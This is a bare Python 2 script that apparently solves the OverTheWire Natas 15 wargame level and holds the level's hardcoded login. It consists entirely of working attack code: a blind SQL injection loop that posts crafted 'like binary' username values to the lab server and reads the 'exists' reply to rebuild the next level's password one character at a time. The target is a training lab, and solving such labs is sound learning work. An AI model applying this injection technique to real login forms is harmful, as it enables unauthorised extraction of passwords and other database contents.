import string

import requests

natas15 = "http://natas15.natas.labs.overthewire.org"
auth = ('natas15', '7h15154h3lL0f4p455w0rD')

chlist = string.letters + string.digits

st = ''
base_string = 'natas16" and password like binary "'

out_form = base_string + st + '_%'
payload=dict(username=out_form)
r = requests.post(natas15, data=payload, auth=auth)
out = r.text

while('exists' in out):
    for ch in chlist:
        print st + ch
        out_form = base_string + st + ch + '%'
        payload=dict(username=out_form)
        r = requests.post(natas15, data=payload, auth=auth)
        out = r.text
        if 'exists' in out:
            st = st + ch
            break

    out_form = base_string + st + '_%'
    payload=dict(username=out_form)
    r = requests.post(natas15, data=payload, auth=auth)
    out = r.text
print "Done and done."
    
exit(0)
